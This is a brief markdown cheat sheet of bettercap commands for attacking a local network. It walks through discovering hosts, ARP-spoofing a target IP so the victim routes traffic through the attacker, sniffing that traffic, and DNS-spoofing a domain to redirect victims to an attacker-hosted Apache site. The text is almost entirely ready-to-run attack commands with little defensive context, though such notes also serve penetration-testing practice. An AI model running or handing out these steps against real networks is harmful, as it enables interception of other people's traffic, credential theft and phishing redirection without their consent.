# Bettercap

TODO: Provide a usage coverage for wireless attacks using bettercap

start bettercap

```
$ sudo bettercap
```

start locating the devices in the network

```bash
net.probe on
```

list all the devices on the network

```bash
net.show
```

## ARP Spoofing attack

- Let the victim think that it's talking to the router

```
set arp.spoof.targets <IP>

arp.spoof on
```

- Enable sniffer mode

```
net.sniff on
```


## Redirection of websites

```bash
net.sniff off
```

```bash
set dns.spoof.domains myamazon.com
```

start your own website (empty)
```bash
service apache2 start
```

```bash
dns.spoof on
```